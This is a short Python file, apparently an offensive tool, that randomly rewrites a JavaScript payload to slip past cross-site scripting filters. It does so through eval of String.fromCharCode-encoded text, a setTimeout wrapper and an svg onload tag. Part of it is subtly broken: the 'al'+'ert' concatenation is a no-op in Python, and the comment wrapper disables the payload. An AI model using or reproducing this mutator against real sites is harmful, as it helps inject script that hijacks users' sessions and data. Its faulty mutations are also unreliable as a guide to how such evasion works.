# advanced_mutator.py
import random, html
def advanced_mutate(payload):
    patterns = [
        lambda p: p.replace("alert", "al"+"ert"),
        lambda p: f"setTimeout(()=>{p},1000)",
        lambda p: f"eval(String.fromCharCode({','.join(str(ord(c)) for c in p)}))",
        lambda p: f"<svg onload={p}>",
        lambda p: "<!--" + p + "-->"
    ]
    return random.choice(patterns)(payload)
